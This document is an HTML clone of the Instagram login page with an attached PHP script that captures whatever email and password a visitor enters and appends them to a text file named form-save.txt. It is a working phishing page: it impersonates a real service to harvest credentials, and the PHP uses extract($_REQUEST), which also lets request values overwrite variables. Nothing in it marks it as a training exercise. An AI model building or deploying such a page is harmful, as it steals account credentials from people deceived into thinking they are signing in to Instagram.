<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <title>Instagram</title>
</head>
<body>
    <br><br><br><br>
    <!-- <img src="./img//ff2c097a681e.jpg" alt="main screen" title="main" /> -->
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only"> e-mail</label>
                    <input name="email" placeholder="Phone number, username, or email" />

                    <label for="password" class="sr-only">Senha</label>
                    <input name="password" type="password" placeholder="Password" />

                    <button type="submit" value="save">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Login with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account? </p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the App</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <br><br>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Top Accounts</a></li>
            <li><a href="#">Hashtags</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Music</a></li>
        </ul>
    
        <!-- <p class="copyright">© 2022 Instagram from Meta</p> -->
    </footer>
</body>
</html>

<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"name:");
    fwrite($file, $email ."\n");
    fwrite($file,"password:");
    fwrite($file, $password ."\n");
    fclose($file);


?>